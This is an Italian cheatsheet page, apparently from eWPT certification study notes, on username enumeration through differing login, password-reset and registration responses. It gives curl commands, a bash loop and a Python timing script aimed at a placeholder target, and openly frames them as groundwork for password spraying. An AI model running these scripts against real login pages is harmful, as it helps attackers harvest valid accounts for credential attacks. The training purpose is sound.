---
layout: cheatsheet
cert: ewpt
cert_label: "eWPT"
title: "Account Enumeration"
permalink: "/cheatsheet/ewpt/07-business-logic/03-account-enumeration/"
section: "Business Logic"
section_order: 7
order: 3
sort_key: 703
---

**Difficoltà:** Intermediate
**Time to Master:** 1.5h
**Prerequisiti:** [02-Race-Conditions.md](/cheatsheet/ewpt/07-business-logic/02-race-conditions/)
**Lab:** PortSwigger Academy: Username enumeration

---

## Obiettivo

"Invalid username" e "Invalid password" sembrano due messaggi innocui, ma messi a confronto ti dicono esattamente quali account esistono senza che tu abbia mai indovinato una password. È una vulnerabilità che gli sviluppatori spesso considerano un dettaglio di UX, non di sicurezza, e invece è la base per rendere efficace qualsiasi attacco successivo di credential stuffing/spraying: perché sprecare tentativi su username che non esistono?

---

## Concetti chiave

### Dove cercano enumeration

| Funzionalità | Differenziale tipico |
|---------------|------------------------|
| Login | "Invalid username" vs "Invalid password" |
| Password reset | "Email inviata" solo se l'account esiste |
| Registrazione | "Username già in uso" |
| Login (timing) | tempo di risposta diverso se l'account esiste (hash verificato vs no) |

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| Burp Intruder | lista username, confronta risposte | messaggio/size/tempo diverso | principale |
| ffuf | `-fr "regex_messaggio_non_esiste"` | filtra risposte per pattern | rapido per liste grandi |

---

## Payload / Esempi

### Esempio 1: enumeration via messaggio di errore differente

```bash
curl -s -d "username=admin&password=x" http://target.com/login
# -> "Invalid password"

curl -s -d "username=nonexistentuser999&password=x" http://target.com/login
# -> "Invalid username"
```

**Spiegazione:** due messaggi distinti rivelano immediatamente se un username esiste, senza bisogno di indovinare la password: usa questa differenza per validare un'intera wordlist di username candidati prima di un attacco di password spraying (vedi [06-Authentication-Authorization/05-Credential-Attacks.md](/cheatsheet/ewpt/06-authentication-authorization/05-credential-attacks/)).

### Esempio 2: enumeration via status code/redirect diverso

```bash
for u in admin test123 nonexistent; do
  echo -n "$u: "
  curl -s -o /dev/null -w "%{http_code}\n" -d "username=$u&password=x" http://target.com/login
done
```

### Esempio 3: enumeration via timing attack (quando i messaggi sono identici)

```python
import requests, statistics

def measure(username, samples=20):
    times = []
    for _ in range(samples):
        t = requests.post("http://target.com/login",
                           data={"username": username, "password": "wrongpass"}).elapsed.total_seconds()
        times.append(t)
    return statistics.median(times)

# Un account esistente spesso impiega più tempo (verifica hash password reale)
# Un account inesistente spesso risponde più velocemente (short-circuit prima dell'hash check)
print("admin:", measure("admin"))
print("nonexistent999:", measure("nonexistent999"))
```

**Spiegazione:** anche quando messaggio e status code sono identici (buona pratica di sicurezza), la differenza di tempo tra "verifica hash bcrypt di una password reale" e "rifiuta subito, utente non trovato" può restare misurabile e sfruttabile, ma tipicamente si tratta di **pochi millisecondi**, facilmente coperti dal rumore di rete. Un singolo confronto (una richiesta contro un'altra) non è affidabile: serve misurare più campioni per candidato (10-20+) e confrontare la mediana, non un solo tentativo. Vedi [04-Timing-Attacks.md](/cheatsheet/ewpt/07-business-logic/04-timing-attacks/) per la metodologia statistica completa.

### Esempio 4: enumeration via funzione "password dimenticata"

```bash
curl -s -d "email=admin@target.com" http://target.com/forgot-password
# -> "Se l'account esiste, riceverai una email"  (buona pratica) 
# vs
# -> "Email inviata a admin@target.com" (rivela esistenza) 
# vs redirect/status diverso tra i due casi
```

---

## Evasion / Bypass Techniques

Non applicabile in senso WAF; la tecnica è interamente nell'analisi statistica delle differenze di risposta: ripeti ogni test più volte per escludere rumore di rete prima di concludere che esista un differenziale timing.

---

## Lab Hands-On

### Lab 1 (PortSwigger): Username enumeration via subtly different responses
**Obiettivo:** distinguere username validi da invalidi tramite differenza sottile nella risposta
**Difficulty:** Medio
**Time:** 30 min

**Walkthrough breve:**
1. Confronta byte-per-byte le risposte per username noto vs sconosciuto
2. Trova il differenziale (anche un singolo carattere di differenza conta)
3. Automatizza con Burp Intruder su una wordlist di username

---

## Common Mistakes

- Fermarsi al confronto del solo messaggio visibile -> controlla anche header, status code, lunghezza esatta della risposta (spesso il differenziale è minuscolo)
- Non ripetere i timing test più volte -> la rete introduce rumore, serve una media su più campioni per essere affidabili

---

## Link Utili

- [PortSwigger: Username enumeration](https://portswigger.net/web-security/authentication/other-mechanisms)

---

## Connessioni

- **Prerequisito:** [02-Race-Conditions.md](/cheatsheet/ewpt/07-business-logic/02-race-conditions/)
- **Prossimo Step:** [04-Timing-Attacks.md](/cheatsheet/ewpt/07-business-logic/04-timing-attacks/)
- **Combinazione con:** [06-Authentication-Authorization/05-Credential-Attacks.md](/cheatsheet/ewpt/06-authentication-authorization/05-credential-attacks/)

---

## Checklist di padronanza

- [ ] So trovare differenziali di messaggio/status/lunghezza risposta
- [ ] So eseguire un timing attack base con script Python
- [ ] So automatizzare l'enumeration su una wordlist con Burp Intruder
